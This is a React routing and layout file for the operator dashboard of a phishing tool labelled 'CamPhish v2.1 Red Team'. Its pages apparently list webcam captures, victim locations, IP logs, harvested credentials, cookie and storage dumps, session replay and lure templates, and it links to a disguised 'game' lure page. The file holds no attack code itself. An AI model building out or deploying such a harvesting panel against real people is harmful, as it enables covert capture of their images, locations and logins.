import { Routes, Route, NavLink } from 'react-router-dom'
import { ThemeProvider, useTheme } from './theme'
import Dashboard from './pages/Dashboard'
import Captures from './pages/Captures'
import Locations from './pages/Locations'
import IpLogs from './pages/IpLogs'
import SessionReplay from './pages/SessionReplay'
import Templates from './pages/Templates'
import Sessions from './pages/Sessions'
import Credentials from './pages/Credentials'
import StorageDumps from './pages/StorageDumps'

const navItems = [
  { to: '/', label: 'Dashboard', icon: '📊' },
  { to: '/captures', label: 'Captures', icon: '📷' },
  { to: '/locations', label: 'Locations', icon: '📍' },
  { to: '/ips', label: 'IP Logs', icon: '🌐' },
  { to: '/credentials', label: 'Credentials', icon: '🔑' },
  { to: '/storage', label: 'Storage', icon: '🍪' },
  { to: '/replay', label: 'Replay', icon: '⚡' },
  { to: '/templates', label: 'Templates', icon: '🎭' },
  { to: '/sessions', label: 'Sessions', icon: '🗂' },
]

function Layout() {
  const { theme, toggle } = useTheme()

  return (
    <div className="min-h-screen flex bg-primary">
      <aside className="glass-nav flex flex-col fixed h-full z-40 transition-all w-14 md:w-56">
        <div className="p-3 md:p-4 border-b border-subtle flex items-center gap-2">
          <span className="text-2xl select-none">🎯</span>
          <div className="hidden md:block">
            <h1 className="text-sm font-bold accent">CamPhish</h1>
            <p className="text-[10px] text-tertiary">v2.1 Red Team</p>
          </div>
        </div>
        <nav className="flex-1 p-2 space-y-1 overflow-y-auto">
          {navItems.map(item => (
            <NavLink
              key={item.to}
              to={item.to}
              end={item.to === '/'}
              className={({ isActive }) =>
                `nav-link ${isActive ? 'active' : ''}`
              }
            >
              <span className="text-lg">{item.icon}</span>
              <span className="hidden md:inline">{item.label}</span>
            </NavLink>
          ))}
        </nav>
        <div className="p-3 border-t border-subtle space-y-1 hidden md:block">
          <button
            onClick={toggle}
            className="nav-link w-full text-left"
          >
            <span>{theme === 'apple' ? '🍎' : '🎨'}</span>
            <span>{theme === 'apple' ? 'Classic' : 'Premium'}</span>
          </button>
          <a href="/t/face-runner" target="_blank" rel="noreferrer" className="nav-link">
            <span>🎮</span> Open Game
          </a>
          <a href="http://localhost:4000/_/admin/" target="_blank" rel="noreferrer" className="nav-link">
            <span>🗄</span> TrailBase
          </a>
        </div>
      </aside>
      <main className="flex-1 overflow-auto animate-fade-in ml-14 md:ml-56 p-5 md:p-6">
        <Routes>
          <Route path="/" element={<Dashboard />} />
          <Route path="/captures" element={<Captures />} />
          <Route path="/locations" element={<Locations />} />
          <Route path="/ips" element={<IpLogs />} />
          <Route path="/credentials" element={<Credentials />} />
          <Route path="/storage" element={<StorageDumps />} />
          <Route path="/replay" element={<SessionReplay />} />
          <Route path="/templates" element={<Templates />} />
          <Route path="/sessions" element={<Sessions />} />
        </Routes>
      </main>
    </div>
  )
}

export default function App() {
  return (
    <ThemeProvider>
      <Layout />
    </ThemeProvider>
  )
}
